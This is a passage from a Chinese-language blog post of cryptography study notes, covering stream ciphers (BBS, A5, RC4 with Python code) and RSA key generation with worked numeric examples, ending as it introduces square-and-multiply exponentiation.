class="hljs-built_in">print</span>(prn)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20211007135014067.png" alt="result" /></p><p><img src="https://upyun.wuuconix.link/image-20211007135358796.png" alt="0和1的个数" /></p><p>只差1，符合了Golomn测试的第一条。</p><p>游程测试也大致符合。</p><p><img src="https://upyun.wuuconix.link/image-20211007135617817.png" alt="游程" /></p><p>所以BBS产生的随机数还是挺不错的。就是计算量比LSFR大多了2333。</p><h2 id="流密码设计目标"><a class="markdownIt-Anchor" href="#流密码设计目标"></a> 流密码设计目标</h2><ol><li>长周期</li><li>高线性复杂度</li><li>统计性能好</li><li>足够的混乱</li></ol><h2 id="a5"><a class="markdownIt-Anchor" href="#a5"></a> A5</h2><p><img src="https://upyun.wuuconix.link/image-20211007140019349.png" alt="A5" /></p><p>实际上就是对3个LSFR进行非线性综合后输出，同时这三个LSRF是钟控的。</p><h2 id="rc4"><a class="markdownIt-Anchor" href="#rc4"></a> RC4</h2><p>RC4十分简单与高效。它又有点像分组加密，因为它的密钥一次性生成一个字节，也就是8位。而不像普通的PRNG，每次吐出一位来。</p><p>以下位RC4的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">s = []<br>k = [<span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">233</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>        s.append(i)<br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>    j = (j + s[i] + k [i % <span class="hljs-number">3</span>]) % <span class="hljs-number">256</span><br>    s[i], s[j] = s[j], s[i]<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------------------------&quot;</span>)<br>Ks = []<br><br>i, j = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    j = (j + s[i]) % <span class="hljs-number">256</span>;<br>    s[i], s[j] = s[j], s[i]<br>    t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>    Ks.append(s[t])<br><span class="hljs-built_in">print</span>(Ks)<br></code></pre></td></tr></table></figure><p>首先把0~255进行打乱，打乱的过程中运用到了我们输入的Secret key。</p><p>然后进行简单又神秘的操作就可以不断地生成8位密钥。以下运行结果，上部分是打乱后地数组，下面是生成的随机数。</p><p><img src="https://upyun.wuuconix.link/image-20211007144207725.png" alt="rc4" /></p><p>流密码到这里就没了，你可能会疑惑流密码怎么只讲了加密，如何解密呢？</p><p>233，实际上因为流密码加密的时候只是与密钥流向亦或了，只要再亦或一个，就回到明文啦！</p><p>所以流密码是如此的简单与高效。我觉得我也能设计一个不注重安全的流密码，正常人应该也不会去差分分析之类的把233，所以应该是十分安全的。</p><h2 id="非对称密码"><a class="markdownIt-Anchor" href="#非对称密码"></a> 非对称密码</h2><p>之前我们学得密码都属于对称密码。发信者和收信者用得是同一个密钥。</p><p>1976年Diffie &amp; Hellman开启了密码学得新方向——非对称密码。这被称为近千年来密码学上最有意义得成就。</p><p>这里的<code>非对称</code>指的是密钥的非对称，即加密是用的某个密钥，解密是用的另一个密钥。</p><h2 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h2><h3 id="rsa加密过程"><a class="markdownIt-Anchor" href="#rsa加密过程"></a> RSA加密过程</h3><p>选择两个大素数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>。得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">n=pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>。然后计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>的欧拉函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，然后选择一个和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>互素的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>。</p><p>这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>（意为encode）会用在加密中。然后求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d=e^{-1}\ mod\  \varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>（意为decode）会用在解密中。</p><p>以下为加密和解密的过程</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msub><mi>E</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=E_m(m)=m^e(mod\ m )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>D</mi><mi>d</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=D_d(c)=c^d(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p>加密者会把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span>放出来做为公钥，大家都可以用来加密。但是由于素数分解的难题，别人无法知道<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>，也就无法解密。</p><p>私钥就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>q</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p,q,d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mclose">)</span></span></span></span>。其实我觉得写成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n, d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">d</span><span class="mclose">)</span></span></span></span>就行？直接根据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>就能解密，不用实际知道<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>。</p><h3 id="rsa例子1"><a class="markdownIt-Anchor" href="#rsa例子1"></a> RSA例子1</h3><ol><li><p>p选择7，q选择11，则n为77。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>60</mn></mrow><annotation encoding="application/x-tex">\varphi(n)=60</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">0</span></span></span></span>。</p></li><li><p>选择一个和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>互素的值，比如37。这个37就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span>了，用来加密。</p></li><li><p>再计算一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>。d是e关于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>的逆。由<code>libnum</code>库计算d为13</p><p><img src="https://upyun.wuuconix.link/image-20211011121448019.png" alt="invmod" /></p></li><li><p>如果密文为2的话。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo>=</mo><msup><mn>2</mn><mn>37</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>77</mn><mo>=</mo><mn>51</mn></mrow><annotation encoding="application/x-tex">c=m^e\ mod\ n=2^{37}\ mod\ 77=51</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">7</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211011122756744.png" alt="指数运算" /></p></li><li><p>解密很简单。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo>=</mo><mn>5</mn><msup><mn>1</mn><mn>13</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">m=c^d\ mod\ n=51^{13}\ mod\ n=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>。</p><p>可以看见解密出来的就是原文。</p></li></ol><h3 id="rsa例子2"><a class="markdownIt-Anchor" href="#rsa例子2"></a> RSA例子2</h3><p>例子1的数比较小。我们试一下这个大的。</p><p><img src="https://upyun.wuuconix.link/image-20211012224609530.png" alt="RSA例子2" /></p><p>这里试着用python实现一波。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>p, q = <span class="hljs-number">885320963</span>, <span class="hljs-number">238855417</span><br>n = p * q <span class="hljs-comment">#211463707796206571</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) <span class="hljs-comment">#211463706672030192</span><br>e = <span class="hljs-number">9007</span> <span class="hljs-comment">#encode</span><br>d = libnum.invmod(e, phi) <span class="hljs-comment">#decode 116402471153538991</span><br>m = <span class="hljs-number">30120</span><br>c = m ** e % n <span class="hljs-comment">#11353585903572286</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;encode: <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br>result = c ** d % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;decode: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>能够正常的加密，但是解密就卡住了。</p><p><img src="https://upyun.wuuconix.link/image-20211012225112274.png" alt="result" /></p><p>我们分析一波原因，加密的时候的式子为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>3012</mn><msup><mn>0</mn><mn>9007</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>211463707796206571</mn></mrow><annotation encoding="application/x-tex">30120^{9007}\ mod\ 211463707796206571</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span><span class="mord mtight">0</span><span class="mord mtight">0</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">1</span><span class="mord">1</span><span class="mord">4</span><span class="mord">6</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">7</span><span class="mord">7</span><span class="mord">9</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">6</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span></span></span></span>。实际上指数已经算很大了，但是由于python强大的计算能力，结果还是秒传。</p><p>我们再来看一看解密时候的式子 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1135358590357228</mn><msup><mn>6</mn><mn>116402471153538991</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>211463707796206571</mn></mrow><annotation encoding="application/x-tex">11353585903572286^{116402471153538991}\ mod\ 211463707796206571</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">3</span><span class="mord">5</span><span class="mord">3</span><span class="mord">5</span><span class="mord">8</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mord">3</span><span class="mord">5</span><span class="mord">7</span><span class="mord">2</span><span class="mord">2</span><span class="mord">8</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span><span class="mord mtight">6</span><span class="mord mtight">4</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">4</span><span class="mord mtight">7</span><span class="mord mtight">1</span><span class="mord mtight">1</span><span class="mord mtight">5</span><span class="mord mtight">3</span><span class="mord mtight">5</span><span class="mord mtight">3</span><span class="mord mtight">8</span><span class="mord mtight">9</span><span class="mord mtight">9</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">1</span><span class="mord">1</span><span class="mord">4</span><span class="mord">6</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">7</span><span class="mord">7</span><span class="mord">9</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">6</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span></span></span></span></p><p>底数这么大，指数也这么大，天王老子来了也算不出来，这也就是python为什么卡住了。</p><p>我们需要一种快速指数算法<code>Efficient Exponentiation</code>，这里便引出了平方乘算法<code>Square-and-Multiply Algorithm</code>。</p><h3 id="sqaure-and-multiply-algorithm"><a class="markdownIt-Anchor" href="#sqaure-and-multiply-algorithm"></a> Sqaure-and-Multiply Algorithm</h3><p>平方乘算法的思想实际很简单，首先我们 